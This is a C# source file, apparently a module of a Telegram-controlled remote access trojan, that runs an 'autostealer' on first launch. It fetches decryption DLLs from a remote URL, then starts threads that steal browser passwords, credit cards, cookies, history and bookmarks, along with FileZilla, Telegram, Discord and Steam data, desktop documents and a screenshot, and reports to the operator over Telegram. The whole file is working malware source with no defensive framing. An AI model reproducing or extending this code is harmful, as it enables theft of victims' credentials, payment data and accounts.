using System.IO;
using System.Threading;
using System.Collections.Generic;

namespace TelegramRAT
{
    internal class AutoStealer
    {
        // Thread
        public static Thread AutoStealerThread = new Thread(steal);
        private static string lockfile = Path.GetDirectoryName(config.InstallPath) + "\\autosteal.lock";

        // Check dll's before decryption chromium passwords
        public static void loadDlls()
        {
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/Sodium.dll");
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium.dll");
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium-64.dll");
        }

        // Steal
        private static void steal()
        {
            // If disabled in config
            if(!config.AutoStealerEnabled)
                return;

            // Only on first start
            if (File.Exists(lockfile))
                return;

            // Create lockfile if not exists
            File.Create(lockfile);
            // Threads list
            List<Thread> threads = new List<Thread> {
                // Screenshot
                new Thread(utils.desktopScreenshot),
                // Steal all data from browsers
                new Thread(Passwords.get),
                new Thread(CreditCards.get),
                new Thread(History.get),
                new Thread(Bookmarks.get),
                new Thread(Cookies.get),
                // Steal other data from apps
                new Thread(FileZilla.get),
                new Thread(TelegramGrabber.get),
                new Thread(DiscordGrabber.get),
                new Thread(SteamGrabber.get),
                // Steal desktop documents
                new Thread(GrabDesktop.get)
            };

            // Info
            telegram.sendText("🌹 Starting autostealer...");
            // Start stealer threads
            foreach(Thread thread in threads)
            {
                thread.Start();
            }
            // Wait 20 seconds
            Thread.Sleep(20 * 1000);
            // Info
            telegram.sendText("🥀 Stopping autostealer...");
            // Stop stealer threads
            foreach (Thread thread in threads)
            {
                if(thread.IsAlive)
                {
                    try
                    {
                        thread.Abort();
                    }
                    catch { }
                }   
            }




        }

    }
}
